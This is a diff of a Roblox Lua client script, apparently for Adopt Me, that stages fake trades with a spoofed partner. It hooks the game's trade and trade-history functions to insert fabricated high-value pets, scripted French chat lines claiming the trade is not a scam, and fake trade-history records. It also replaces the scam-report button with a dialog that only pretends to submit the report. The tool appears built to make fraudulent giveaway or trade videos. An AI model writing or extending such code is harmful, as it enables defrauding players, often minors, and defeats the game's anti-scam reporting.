+       'rbxassetid://84667805159408'
+end
+
+local downloader = load('DownloadClient')
+local petModels = {}
+
+local function getPetModel(kind)
+   if petModels[kind] then
+       return petModels[kind]:Clone()
+   end
+
+   local success, streamed = pcall(function()
+       local promise = downloader.promise_download_copy('Pets', kind)
+       if promise then
+           return promise:expect()
+       end
+       return nil
+   end)
+
+   if success and streamed then
+       petModels[kind] = streamed
+       return streamed:Clone()
+   else
+       warn('Failed to download pet model for:', kind)
+       return nil
+   end
+end
+
+if not TradeApp then
+   return
+end
+
+local CONFIG = {
+   PARTNER_NAME = '1DangerX01',
+   PARTNER_USER_ID = 987654321,
+   AUTO_ACCEPT_DELAY = 1,
+   AUTO_CONFIRM_DELAY = 1,
+   SPECTATOR_COUNT = 3,
+   AUTO_PARTNER = true,
+   NEGOTIATION_LOCK = 5,
+   CONFIRMATION_LOCK_PER_ITEM = 3,
+   SHOW_TRADE_REQUEST = true,
+   TRADE_REQUEST_DELAY = 1,
+   ADD_PET_REQUEST_DELAY = 1,
+   SPAWN_FAKE_PLAYER_WITH_RANDOM_PET = false,
+   FAKE_PLAYER_ACCEPT_TRADE_REQUEST = 1,
+   CHAT_MESSAGES = {
+       'salut je peut boost sa',
+       'tu boost?',
+       'je suis abo',
+       'OMGG WSH JAI CRU CT FAKE',
+       'c pas du script?',
+       'slt bb',
+       'vasy',
+       'cc',
+       'cc mgo',
+       'omg mercii',
+       'les gens abonnez vous tous',
+       'MERCI T GRV TRUSTED',
+       'omggg',
+       'OMGGGGGGGGGGGG',
+       'je peut avoir un mega bat?',
+       'oui stp cest mon dp',
+       'merci wsh jai cru ct un hack',
+       'OND C PAS DES FAUX PETS WSH',
+       'WALLAH C PAS DU SCRIPT CHUIS CHOQUER',
+       'mais eh mgo tu gère de fou',
+       'coucou jai acheter un mega owl',
+       'slt c moi',
+       'je t acheter une giraffe nfr',
+       'stp scam pas',
+       'omg jai trop peur stp',
+       'c pas du scam?',
+       'ehh',
+       'oui',
+       'ouiii',
+       't super trusted',
+       'je gagne quoi si je boost sa',
+       'dit moi je peut boost quoi',
+       'merci bcpp',
+       'LES GENS ELLE SCAM PAS',
+       'LVDM CHUIS SUPER CHOQUER',
+       'mais eh lv c vrm vrai',
+       'LE PIRE C QUE C DES VRAI PETS WTF',
+       'ton shop est trusted?',
+       'je like a fond bb',
+       'omg merci jte ferais une pub',
+       'oui tkt',
+       'passs du tout',
+       'nn dsl je veut pas',
+       'jpeut boost qlq chose dautre?',
+       'lola jte mange les fesses',
+       'cc mbb',
+       't sur c vrm vrai',
+       'Okk',
+       'vzz',
+       'tu donne des pets?',
+       'heyy',
+       'blablabloublebourg',
+       'tu peut me donner un de mes dp de mon profile?',
+       'stv',
+       'tiens jte donne un pet admin special',
+       'persone la et cest pour te faire un cdx',
+       'tu veut une surprise?',
+       'si tu me scam pas jte donne un pet tu sera choquer prsn la',
+       'ta une offre?',
+       'JV MABO DIRECT',
+       'jte detestais grv au debut mtn jtadoreee',
+
+   },
+   AUTO_CHAT_DELAY = 2,
+   VERIFIED_FRIENDS = {
+       'Agusmareborn',
+       'Kellyvault',
+       'J3llynoah',
+       'Rainbowriley321',
+       'Bobazmalibu',
+       'H3llSANG3LX',
+       'Xcallmeholly',
+       'Niniko_201999',
+   },
+   SHOW_VERIFIED_FRIEND = false,
+}
+
+local mockState = {
+   active = false,
+   trade = nil,
+   isAddingItem = false,
+   partnerActionPending = false,
+   originalFunctions = {},
+   controlPanelOpen = false,
+   tradeCompleting = false,
+   scamWarningShown = true,
+   originalDialogFunction = nil,
+   blockedTradeRequests = {},
+   tradeHistory = {},
+   addedTradeIds = {},
+   pendingTradeRequest = false,
+   canShowTradeRequest = true,
+   tradeRequestBlocked = false,
+}
+
+local petSpawnState = {
+   activeFlags = { F = false, R = false, N = false, M = false },
+   validPetNames = {},
+   validPetNamesClean = {},
+}
+
+-- Define pet rarity tiers (mid tiers and above)
+local highValuePets = {
+   'Shadow Dragon',
+   'Bat Dragon',
+   'Frost Dragon',
+   'Giraffe',
+   'Blazing Lion',
+   'Orchid Butterfly',
+   'Diamond Butterfly',
+   'African Wild Dog',
+   'Owl',
+   'Parrot',
+   'Crow',
+   'Evil Unicorn',
+   'Balloon Unicorn',
+   'Dalmatian',
+   'Arctic Reindeer',
+   'Kangaroo',
+   'Turtle',
+   'Giant Panda',
+   'Hedgehog',
+   'Cow',
+   'Chocolate Chip Bat Dragon',
+   'Flamingo',
+   'Peppermint Penguin',
+   'Strawberry Shortcake Bat Dragon'
+}
+
+local completePetList = {
+   'Shadow Dragon',
+   'Bat Dragon',
+   'Frost Dragon',
+   'Giraffe',
+   'Owl',
+   'Parrot',
+   'Crow',
+   'Evil Unicorn',
+   'Arctic Reindeer',
+   'Hedgehog',
+   'Dalmatian',
+   'Turtle',
+   'Kangaroo',
+   'Lion',
+   'Elephant',
+   'Rhino',
+   'Chocolate Chip Bat Dragon',
+   'Cow',
+   'Blazing Lion',
+   'African Wild Dog',
+   'Flamingo',
+   'Diamond Butterfly',
+   'Mini Pig',
+   'Caterpillar',
+   'Albino Monkey',
+   'Candyfloss Chick',
+   'Pelican',
+   'Blue Dog',
+   'Pink Cat',
+   'Haetae',
+   'Peppermint Penguin',
+   'Winged Tiger',
+   'Sugar Glider',
+   'Shark Puppy',
+   'Goat',
+   'Sheeeeep',
+   'Lion Cub',
+   'Nessie',
+   'Flamingo',
+   'Frostbite Bear',
+   'Balloon Unicorn',
+   'Honey Badger',
+   'Hot Doggo',
+   'Crocodile',
+   'Hare',
+   'Ram',
+   'Yeti',
+   'Meetkat',
+   'Jellyfish',
+   'Happy Clown',
+   'Orchid Butterfly',
+   'Many Mackerel',
+   'Strawberry Shortcake Bat Dragon',
+   'Zombie Buffalo',
+   'Fairy Bat Dragon',
+}
+
+-- Function to check if a pet is Balloon Unicorn or higher rarity
+local function isPetAboveBalloonUnicorn(petName)
+   for _, highValuePet in ipairs(highValuePets) do
+       if petName == highValuePet then
+           return true
+       end
+   end
+   return false
+end
+
+-- Function to get a random pet that's Balloon Unicorn or higher
+local function getRandomHighValuePet()
+   return highValuePets[math.random(1, #highValuePets)]
+end
+
+local function loadPetNames()
+   for category_name, category_table in pairs(InventoryDB) do
+       if category_name == 'pets' then
+           for id, item in pairs(category_table) do
+               petSpawnState.validPetNames[#petSpawnState.validPetNames + 1] =
+                   item.name
+               petSpawnState.validPetNamesClean[#petSpawnState.validPetNamesClean + 1] =
+                   item.name:lower():gsub('%s+', '')
+           end
+           break
+       end
+   end
+end
+loadPetNames()
+
+local function checkTradeLicense(player)
+   if not player then
+       return false
+   end
+
+   local success, hasLicense = pcall(function()
+       if TradeApp and TradeApp._check_if_player_has_trade_license then
+           return TradeApp:_check_if_player_has_trade_license(player)
+       end
+
+       local RouterClient = load('RouterClient')
+       if RouterClient then
+           local result = RouterClient.get('TradeAPI/GetTradeLicenseStatus')
+               :InvokeServer(player.UserId)
+           return result and result.has_license == true
+       end
+
+       return true
+   end)
+
+   return success and hasLicense or true
+end
+
+local function isVerifiedFriend(username)
+   for _, friendName in ipairs(CONFIG.VERIFIED_FRIENDS) do
+       if friendName:lower() == username:lower() then
+           return true
+       end
+   end
+   return false
+end
+
+local function storeOriginalFunctions()
+   local funcs = {
+       '_get_local_trade_state',
+       '_overwrite_local_trade_state',
+       '_change_local_trade_state',
+       '_get_my_offer',
+       '_get_partner_offer',
+       '_get_my_player',
+       '_get_partner',
+       '_get_current_trade_stage',
+       '_on_accept_pressed',
+       '_on_confirm_pressed',
+       '_on_unaccept_pressed',
+       '_decline_trade',
+       '_add_item_to_my_offer',
+       '_remove_item_from_my_offer',
+       '_lock_trade_for_appropriate_time',
+       '_get_lock_time',
+       'refresh_all',
+       '_evaluate_trade_fairness',
+       '_show_scam_victim_warning',
+       '_show_scam_perpetrator_warning',
+   }
+
+   for _, funcName in ipairs(funcs) do
+       if TradeApp[funcName] then
+           mockState.originalFunctions[funcName] = TradeApp[funcName]
+       end
+   end
+
+   if TradeHistoryApp then
+       if TradeHistoryApp._get_trade_history then
+           mockState.originalGetTradeHistory =
+               TradeHistoryApp._get_trade_history
+       end
+       if TradeHistoryApp.report_scam then
+           mockState.originalReportScam = TradeHistoryApp.report_scam
+       end
+   end
+end
+
+storeOriginalFunctions()
+
+local function createMockPartner(player)
+   return setmetatable({
+       Name = player and player.Name or CONFIG.PARTNER_NAME,
+       DisplayName = player and player.DisplayName or CONFIG.PARTNER_NAME,
+       UserId = player and player.UserId or CONFIG.PARTNER_USER_ID,
+   }, {
+       __index = function(t, k)
+           if k == 'Parent' then
+               return Players
+           end
+           if k == 'IsA' then
+               return function(self, className)
+                   return className == 'Player'
+               end
+           end
+           return rawget(t, k)
+       end,
+       __tostring = function()
+           return player and player.Name or CONFIG.PARTNER_NAME
+       end,
+   })
+end
+
+local mockPartner = createMockPartner()
+
+local function createMockTrade(realPlayer)
+   local partner = realPlayer and createMockPartner(realPlayer) or mockPartner
+
+   local hasLicense = true
+   if realPlayer then
+       hasLicense = checkTradeLicense(realPlayer)
+   end
+
+   return {
+       trade_id = 'MOCK_' .. tick(),
+       sender = Players.LocalPlayer,
+       recipient = partner,
+       sender_offer = {
+           items = {},
+           player_name = Players.LocalPlayer.Name,
+           negotiated = false,
+           confirmed = false,
+       },
+       recipient_offer = {
+           items = {},
+           player_name = CONFIG.PARTNER_NAME,
+           negotiated = false,
+           confirmed = false,
+       },
+       current_stage = 'negotiation',
+       offer_version = 1,
+       sender_has_trade_license = true,
+       recipient_has_trade_license = hasLicense,
+       busy_indicators = {},
+       subscriber_count = CONFIG.SPECTATOR_COUNT,
+   }
+end
+
+local function createTradeHistoryRecord(trade)
+   local record = {
+       trade_id = trade.trade_id,
+       timestamp = os.time(),
+       sender_user_id = Players.LocalPlayer.UserId,
+       sender_name = Players.LocalPlayer.Name,
+       sender_items = TableUtil.deep_copy(trade.sender_offer.items),
+       recipient_user_id = trade.recipient.UserId,
+       recipient_name = CONFIG.PARTNER_NAME,
+       recipient_items = TableUtil.deep_copy(trade.recipient_offer.items),
+       reported = false,
+       reverted = nil,
+   }
+   return record
+end
+
+local function appendToTradeHistory(tradeRecord)
+   if mockState.addedTradeIds[tradeRecord.trade_id] then
+       return
+   end
+
+   mockState.addedTradeIds[tradeRecord.trade_id] = true
+   table.insert(mockState.tradeHistory, tradeRecord)
+end
+
+local function hookTradeHistoryFunctions()
+   if not TradeHistoryApp then
+       return
+   end
+
+   TradeHistoryApp._get_trade_history = function(self, useCache)
+       local history = mockState.originalGetTradeHistory(self, useCache)
+
+       local combined = {}
+       local seenIds = {}
+
+       if history then
+           for _, realTrade in ipairs(history) do
+               if not seenIds[realTrade.trade_id] then
+                   table.insert(combined, realTrade)
+                   seenIds[realTrade.trade_id] = true
+               end
+           end
+       end
+
+       for _, mockTrade in ipairs(mockState.tradeHistory) do
+           if not seenIds[mockTrade.trade_id] then
+               table.insert(combined, mockTrade)
+               seenIds[mockTrade.trade_id] = true
+           end
+       end
+
+       self.cached_trade_history = combined
+       return combined
+   end
+
+      -- UPDATED: Enhanced report_scam hook with hint and proper dialog flow
+    TradeHistoryApp.report_scam = function(self, tradeData)
+        if tradeData and string.find(tostring(tradeData.trade_id), 'MOCK_') then
+            -- Hide the trade history app temporarily
+            self.UIManager.set_app_visibility(self.ClassName, false)
+
+            -- Show the REAL report dialog with full options
+            local dialogResult, reasonText, otherText = 
+                self.UIManager.apps.DialogApp:dialog({
+                    dialog_type = 'ReportScamDialog',
+                    suspect_name = CONFIG.PARTNER_NAME,
+                    placeholder_text = 'What happened? (Optional)',
+                    max_length = 500,
+                    use_utf8_length = true,
+                    left = 'Cancel',
+                    right = 'Report'
+                })
+            
+            if dialogResult == 'Report' then
+                -- Show "Submitting report..." hint
+                if self.UIManager.apps.HintApp then
+                    self.UIManager.apps.HintApp:hint({
+                        text = 'Submitting scam report...',
+                        length = 4,
+                        yields = false,
+                    })
+                end
+                
+                -- Simulate delay for submission
+                task.wait(2)
+                
+                -- Mark as reported
+                for _, record in ipairs(mockState.tradeHistory) do
+                    if record.trade_id == tradeData.trade_id then
+                        record.reported = true
+                        break
+                    end
+                end
+                
+                -- Show success message
+                self.UIManager.apps.DialogApp:dialog({
+                    text = 'Thanks for your report!',
+                    button = 'Close',
+                    yields = false,
+                })
+                
+                -- Auto-refresh the trade history
+                task.spawn(function()
+                    task.wait(0.5)
+                    if self._refresh then
+                        pcall(function() self:_refresh() end)
+                    end
+                end)
+                
+                return true
+            end
+            
+            -- Re-show trade history app if canceled
+            self.UIManager.set_app_visibility(self.ClassName, true)
+            return false
+        end
+        return mockState.originalReportScam(self, tradeData)
+    end
+end
+
+hookTradeHistoryFunctions()
+
+local function update_busy_indicators(args1)
+   local v144 = mockState.trade.busy_indicators
+   local v145 = TradeApp._get_partner().UserId
+   v144[tostring(v145)] = args1
+   TradeApp.partner_negotiation_offer_pane:display_busy(v144[tostring(v145)])
+end
+
+local function addPetToPartnerOffer(petName, flags)
+   if not mockState.active or not mockState.trade then
+       return false, 'No active mock trade'
+   end
+
+   if mockState.trade.current_stage == 'confirmation' then
+       return false, 'Cannot modify during confirmation'
+   end
+
+   if #mockState.trade.recipient_offer.items >= 18 then
+       return
+   end
+
+   update_busy_indicators({
+       ['picking'] = true,
+   })
+
+   task.wait(CONFIG.ADD_PET_REQUEST_DELAY)
+
+   for category_name, category_table in pairs(InventoryDB) do
+       if category_name == 'pets' then
+           for id, item in pairs(category_table) do
+               if item.name == petName then
+                   local fake_uuid = game:GetService('HttpService')
+                       :GenerateGUID()
+                   local petItem = {
+                       category = 'pets',
+                       kind = id,
+                       unique = fake_uuid,
+                       properties = {
+                           flyable = flags.F,
+                           rideable = flags.R,
+                           neon = flags.N,
+                           mega_neon = flags.M,
+                           age = 1,
+                       },
+                   }
+
+                   table.insert(mockState.trade.recipient_offer.items, petItem)
+
+                   mockState.trade.sender_offer.negotiated = false
+                   mockState.trade.recipient_offer.negotiated = false
+
+                   if mockState.trade.current_stage == 'confirmation' then
+                       mockState.trade.current_stage = 'negotiation'
+                       mockState.trade.sender_offer.confirmed = false
+                       mockState.trade.recipient_offer.confirmed = false
+                   end
+
+                   mockState.trade.offer_version = mockState.trade.offer_version
+                       + 1
+                   TradeApp:_overwrite_local_trade_state(mockState.trade)
+
+                   if TradeApp._lock_trade_for_appropriate_time then
+                       TradeApp:_lock_trade_for_appropriate_time()
+                   end
+
+                   if TradeApp._render_message_in_trade_chat then
+                       TradeApp:_render_message_in_trade_chat(
+                           nil,
+                           string.format(
+                               '%s added %s.',
+                               CONFIG.PARTNER_NAME,
+                               petName
+                           ),
+                           true
+                       )
+                   end
+
+                   update_busy_indicators({
+                       ['picking'] = false,
+                   })
+                   return true, 'Pet added successfully'
+               end
+           end
+       end
+   end
+
+   return false, 'Pet not found'
+end
+
+local function removeLatestPetFromPartnerOffer()
+   if not mockState.active or not mockState.trade then
+       return false, 'No active mock trade'
+   end
+
+   if mockState.trade.current_stage == 'confirmation' then
+       return false, 'Cannot modify during confirmation'
+   end
+
+   local partnerItems = mockState.trade.recipient_offer.items
+   if #partnerItems == 0 then
+       return false, 'No items to remove'
+   end
+
+   local removedItem = table.remove(partnerItems)
+
+   mockState.trade.sender_offer.negotiated = false
+   mockState.trade.recipient_offer.negotiated = false
+
+   if mockState.trade.current_stage == 'confirmation' then
+       mockState.trade.current_stage = 'negotiation'
+       mockState.trade.sender_offer.confirmed = false
+       mockState.trade.recipient_offer.confirmed = false
+   end
+
+   mockState.trade.offer_version = mockState.trade.offer_version + 1
+   TradeApp:_overwrite_local_trade_state(mockState.trade)
+
+   if TradeApp._lock_trade_for_appropriate_time then
+       TradeApp:_lock_trade_for_appropriate_time()
+   end
+
+   if TradeApp._render_message_in_trade_chat then
+       local itemName = 'item'
+       if removedItem.category == 'pets' then
+           for category_name, category_table in pairs(InventoryDB) do
+               if category_name == 'pets' then
+                   for id, item in pairs(category_table) do
+                       if id == removedItem.kind then
+                           itemName = item.name
+                           break
+                       end
+                   end
+                   break
+               end
+           end
+       end
+
+       TradeApp:_render_message_in_trade_chat(
+           nil,
+           string.format('%s removed %s.', CONFIG.PARTNER_NAME, itemName),
+           true
+       )
+   end
+
+   return true, 'Pet removed successfully'
+end
+
+local function generateRandomPetProperties()
+   local petTypes = { 'FR', 'NFR' }
+   local chosenType = petTypes[math.random(1, #petTypes)]
+
+   local properties = { F = false, R = false, N = false }
+
+   if chosenType == 'FR' then
+       properties.F = true
+       properties.R = true
+   elseif chosenType == 'NFR' then
+       properties.F = true
+       properties.R = true
+       properties.N = true
+   end
+
+   return properties
+end
+
+local function getPropertiesString(properties)
+   local props = {}
+   if properties.M then
+       table.insert(props, 'Mega')
+   end
+   if properties.N then
+       table.insert(props, 'Neon')
+   end
+   if properties.F then
+       table.insert(props, 'Fly')
+   end
+   if properties.R then
+       table.insert(props, 'Ride')
+   end
+
+   if #props > 0 then
+       return ' (' .. table.concat(props, ' ') .. ')'
+   end
+   return ''
+end
+
+local function sendTradeChatMessage(message)
+    if not mockState.active or not mockState.trade then
+        return false
+    end
+
+    if TradeApp and TradeApp._render_message_in_trade_chat then
+        -- Create fake player object for the message
+        local fakePlayer = {
+            Name = CONFIG.PARTNER_NAME,
+            DisplayName = CONFIG.PARTNER_NAME,
+            UserId = CONFIG.PARTNER_USER_ID,
+        }
+        
+        setmetatable(fakePlayer, {
+            __tostring = function()
+                return CONFIG.PARTNER_NAME
+            end
+        })
+
+        TradeApp:_render_message_in_trade_chat(fakePlayer, message)
+        return true
+    end
+
+    return false
+end
+
+local function partnerAutoAction()
+   if
+       not mockState.active
+       or not mockState.trade
+       or mockState.partnerActionPending
+   then
+       return
+   end
+
+   mockState.partnerActionPending = true
+
+   while
+       TradeApp.lock_countdown
+       and TradeApp.lock_countdown.is_going
+       and TradeApp.lock_count...(truncated 110052 characters)...
+           local buttonStroke = button:FindFirstChildOfClass('UIStroke')
+           local nameLabel = button:FindFirstChildOfClass('TextLabel')
+           local nameStroke = nameLabel
+               and nameLabel:FindFirstChildOfClass('UIStroke')
+
+           local stage1 = TweenInfo.new(
+               0.1,
+               Enum.EasingStyle.Quint,
+               Enum.EasingDirection.Out
+           )
+           local stage2 = TweenInfo.new(
+               0.25,
+               Enum.EasingStyle.Back,
+               Enum.EasingDirection.Out
+           )
+           local stage3 = TweenInfo.new(
+               0.15,
+               Enum.EasingStyle.Quint,
+               Enum.EasingDirection.Out
+           )
+
+           TweenService:Create(button, stage1, {
+               Size = UDim2.new(1.02, -8, 0, 28),
+               Position = UDim2.new(-0.01, 0, 0, 0),
+               BackgroundTransparency = 0.4,
+           }):Play()
+
+           task.wait(0.1)
+
+           TweenService:Create(button, stage2, {
+               Size = UDim2.new(1, -8, 0, 26),
+               Position = UDim2.new(0, 0, 0, 0),
+               BackgroundTransparency = 0.2,
+           }):Play()
+
+           if buttonStroke then
+               TweenService:Create(buttonStroke, stage2, {
+                   Thickness = 1.0,
+                   Transparency = 0.3,
+               }):Play()
+           end
+
+           task.wait(0.06)
+
+           if nameLabel then
+               TweenService:Create(nameLabel, stage3, { TextTransparency = 0 })
+                   :Play()
+           end
+           if nameStroke then
+               TweenService:Create(nameStroke, stage3, { Transparency = 0.8 })
+                   :Play()
+           end
+       end)
+   end
+
+   -- Animate chat buttons
+   for i, button in ipairs(chatListFrame:GetChildren()) do
+       if button:IsA('TextButton') then
+           local delay = (i - 1) * 0.05
+           task.spawn(function()
+               task.wait(delay)
+               local buttonStroke = button:FindFirstChildOfClass('UIStroke')
+               local messageLabel = button:FindFirstChildOfClass('TextLabel')
+               local messageStroke = messageLabel
+                   and messageLabel:FindFirstChildOfClass('UIStroke')
+
+               local stage1 = TweenInfo.new(
+                   0.1,
+                   Enum.EasingStyle.Quint,
+                   Enum.EasingDirection.Out
+               )
+               local stage2 = TweenInfo.new(
+                   0.25,
+                   Enum.EasingStyle.Back,
+                   Enum.EasingDirection.Out
+               )
+               local stage3 = TweenInfo.new(
+                   0.15,
+                   Enum.EasingStyle.Quint,
+                   Enum.EasingDirection.Out
+               )
+
+               TweenService
+                   :Create(button, stage1, {
+                       Size = UDim2.new(1.02, -8, 0, 28),
+                       Position = UDim2.new(-0.01, 0, 0, 0),
+                       BackgroundTransparency = 0.4,
+                   })
+                   :Play()
+
+               task.wait(0.1)
+
+               TweenService
+                   :Create(button, stage2, {
+                       Size = UDim2.new(1, -8, 0, 26),
+                       Position = UDim2.new(0, 0, 0, 0),
+                       BackgroundTransparency = 0.2,
+                   })
+                   :Play()
+
+               if buttonStroke then
+                   TweenService
+                       :Create(buttonStroke, stage2, {
+                           Thickness = 1.0,
+                           Transparency = 0.3,
+                       })
+                       :Play()
+               end
+
+               task.wait(0.06)
+
+               if messageLabel then
+                   TweenService
+                       :Create(messageLabel, stage3, { TextTransparency = 0 })
+                       :Play()
+               end
+               if messageStroke then
+                   TweenService
+                       :Create(messageStroke, stage3, { Transparency = 0.8 })
+                       :Play()
+               end
+           end)
+       end
+   end
+end
+
+buildUsersList()
+buildChatList()
+
+-- PETS TAB with smaller elements
+local petsFrame = tabFrames['Pets']
+
+-- Pet input section
+local petInputSection = Instance.new('Frame')
+petInputSection.Size = UDim2.new(1, 0, 0, 160)
+petInputSection.Position = UDim2.new(0, 0, 0, 0)
+petInputSection.BackgroundTransparency = 1
+petInputSection.Parent = petsFrame
+
+local petNameHeading = Instance.new('TextLabel')
+petNameHeading.Size = UDim2.new(1, 0, 0, 14)
+petNameHeading.BackgroundTransparency = 1
+petNameHeading.Text = 'Pet Name To Add'
+petNameHeading.Font = Enum.Font.SourceSansSemibold
+petNameHeading.TextSize = 10
+petNameHeading.TextColor3 = Color3.fromRGB(255,255,255)  -- white
+petNameHeading.TextXAlignment = Enum.TextXAlignment.Left
+petNameHeading.Parent = petInputSection
+
+local petNameBox = Instance.new('TextBox')
+petNameBox.Size = UDim2.new(1, 0, 0, 22)
+petNameBox.Position = UDim2.new(0, 0, 0, 16)
+petNameBox.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+petNameBox.BackgroundTransparency = 0.2
+petNameBox.Text = ''
+petNameBox.PlaceholderText = 'Enter pet name...'
+petNameBox.Font = Enum.Font.FredokaOne
+petNameBox.TextSize = 10
+petNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+petNameBox.ClearTextOnFocus = false
+petNameBox.Parent = petInputSection
+
+local petNameCorner = Instance.new('UICorner')
+petNameCorner.CornerRadius = UDim.new(0, 4)
+petNameCorner.Parent = petNameBox
+
+local petNameStroke = Instance.new('UIStroke')
+petNameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+petNameStroke.Color = Color3.fromRGB(255,255,255)  -- white
+petNameStroke.Thickness = 0.8
+petNameStroke.Transparency = 0.5
+petNameStroke.Parent = petNameBox
+
+function capitalizeWords(str)
+   local result = ''
+   local i = 1
+   local n = #str
+
+   while i <= n do
+       if str:sub(i, i):match('%S') then
+           local wordStart = i
+           while i <= n and str:sub(i, i):match('%S') do
+               i = i + 1
+           end
+           local word = str:sub(wordStart, i - 1)
+           if #word > 0 then
+               word = word:sub(1, 1):upper() .. word:sub(2):lower()
+           end
+           result = result .. word
+       else
+           result = result .. str:sub(i, i)
+           i = i + 1
+       end
+   end
+
+   return result
+end
+
+petNameBox:GetPropertyChangedSignal('Text'):Connect(function()
+   local inputText = petNameBox.Text
+   local newText = capitalizeWords(inputText)
+   if newText ~= inputText then
+       petNameBox.Text = newText
+       return
+   end
+
+   local displayedText = petNameBox.Text
+   local cleanName = displayedText:lower():gsub('%s+', '')
+
+   local isValid = false
+   for _, name in ipairs(petSpawnState.validPetNames) do
+       if
+           name:lower() == displayedText:lower()
+           or name:lower():gsub('%s+', '') == cleanName
+       then
+           isValid = true
+           break
+       end
+   end
+
+   TweenService
+       :Create(petNameStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+           Color = isValid and Color3.fromRGB(0, 255, 100)
+               or displayedText == '' and Color3.fromRGB(100, 100, 100)
+               or Color3.fromRGB(255, 100, 100),
+           Thickness = isValid and 1.2 or 0.8,
+       })
+       :Play()
+end)
+
+local propContainer = Instance.new('Frame')
+propContainer.Size = UDim2.new(1, 0, 0, 22)
+propContainer.Position = UDim2.new(0, 0, 0, 43)
+propContainer.BackgroundTransparency = 1
+propContainer.Parent = petInputSection
+
+local prefixes = { 'M', 'N', 'F', 'R' }
+local prefixColors = {
+   M = Color3.fromRGB(170, 0, 255),
+   N = Color3.fromRGB(0, 255, 100),
+   F = Color3.fromRGB(0, 200, 255),
+   R = Color3.fromRGB(255, 50, 150),
+}
+
+local prefixButtons = {}
+for i, prefix in ipairs(prefixes) do
+   local prefixButton = Instance.new('TextButton')
+   prefixButton.Size = UDim2.new(0.23, 0, 1, 0)
+   prefixButton.Position = UDim2.new((i - 1) * 0.25 + 0.01, 0, 0, 0)
+   prefixButton.Text = prefix
+   prefixButton.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+   prefixButton.BackgroundTransparency = 0.2
+   prefixButton.Font = Enum.Font.FredokaOne
+   prefixButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+   prefixButton.TextSize = 12
+   prefixButton.Parent = propContainer
+
+   local buttonCorner = Instance.new('UICorner')
+   buttonCorner.CornerRadius = UDim.new(0, 4)
+   buttonCorner.Parent = prefixButton
+
+   local buttonStroke = Instance.new('UIStroke')
+   buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+   buttonStroke.Color = prefixColors[prefix]
+   buttonStroke.Thickness = 1.0
+   buttonStroke.Transparency = 0.5
+   buttonStroke.Parent = prefixButton
+
+   local textStroke = Instance.new('UIStroke')
+   textStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+   textStroke.Color = Color3.new(0, 0, 0)
+   textStroke.Thickness = 1.0
+   textStroke.Parent = prefixButton
+
+   prefixButtons[prefix] = { button = prefixButton, stroke = buttonStroke }
+
+   prefixButton.MouseButton1Click:Connect(function()
+       if prefix == 'M' and petSpawnState.activeFlags['N'] then
+           return
+       end
+       if prefix == 'N' and petSpawnState.activeFlags['M'] then
+           return
+       end
+
+       petSpawnState.activeFlags[prefix] =
+           not petSpawnState.activeFlags[prefix]
+
+       if petSpawnState.activeFlags[prefix] then
+           prefixButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+           TweenService
+               :Create(
+                   buttonStroke,
+                   TweenInfo.new(0.3, Enum.EasingStyle.Quad),
+                   {
+                       Color = Color3.fromRGB(0, 255, 0),
+                       Thickness = 1.2,
+                       Transparency = 0.2,
+                   }
+               )
+               :Play()
+       else
+           prefixButton.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+           TweenService
+               :Create(
+                   buttonStroke,
+                   TweenInfo.new(0.3, Enum.EasingStyle.Quad),
+                   {
+                       Color = prefixColors[prefix],
+                       Thickness = 1.0,
+                       Transparency = 0.5,
+                   }
+               )
+               :Play()
+       end
+   end)
+end
+
+local requestAddPetBox, requestAddPetStroke, requestAddPetText =
+   createSettingRow(
+       'Add Pet Delay (s)',
+       CONFIG.ADD_PET_REQUEST_DELAY,
+       petInputSection
+   )
+requestAddPetBox.Position = UDim2.new(0, 0, 0, 72)
+requestAddPetText.Position = UDim2.new(0, 0, 0, 58)
+requestAddPetBox.FocusLost:Connect(function()
+   local value = tonumber(requestAddPetBox.Text)
+   if value and value >= 0 then
+       CONFIG.ADD_PET_REQUEST_DELAY = value
+   else
+       requestAddPetBox.Text = tostring(CONFIG.ADD_PET_REQUEST_DELAY)
+   end
+end)
+
+-- SMALLER Add Pet Button
+local addPetButton = Instance.new('TextButton')
+addPetButton.Size = UDim2.new(1, 0, 0, 22)
+addPetButton.Position = UDim2.new(0, 0, 0, 98)
+addPetButton.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+addPetButton.BackgroundTransparency = 0.2
+addPetButton.Text = 'Add Pet to Trade'
+addPetButton.Font = Enum.Font.FredokaOne
+addPetButton.TextSize = 10
+addPetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+addPetButton.Parent = petInputSection
+
+local addPetCorner = Instance.new('UICorner')
+addPetCorner.CornerRadius = UDim.new(0, 4)
+addPetCorner.Parent = addPetButton
+
+local addPetStroke = Instance.new('UIStroke')
+addPetStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+addPetStroke.Color = Color3.fromRGB(255, 255, 255)
+addPetStroke.Thickness = 1.0
+addPetStroke.Transparency = 0.3
+addPetStroke.Parent = addPetButton
+
+-- SMALLER Remove Pet Button
+local removePetButton = Instance.new('TextButton')
+removePetButton.Size = UDim2.new(1, 0, 0, 22)
+removePetButton.Position = UDim2.new(0, 0, 0, 125)
+removePetButton.BackgroundColor3 = Color3.fromRGB(173, 216, 230)  -- bleu clair
+removePetButton.BackgroundTransparency = 0.2
+removePetButton.Text = 'Remove Latest Pet'
+removePetButton.Font = Enum.Font.FredokaOne
+removePetButton.TextSize = 10
+removePetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+removePetButton.Parent = petInputSection
+
+local removePetCorner = Instance.new('UICorner')
+removePetCorner.CornerRadius = UDim.new(0, 4)
+removePetCorner.Parent = removePetButton
+
+local removePetStroke = Instance.new('UIStroke')
+removePetStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+removePetStroke.Color = Color3.fromRGB(255, 255, 255)
+removePetStroke.Thickness = 1.0
+removePetStroke.Transparency = 0.3
+removePetStroke.Parent = removePetButton
+
+-- MODIFIED: Add Random Pet Button - Only adds high-value pets
+local addRandomPetButton = Instance.new('TextButton')
+addRandomPetButton.Size = UDim2.new(1, 0, 0, 22)
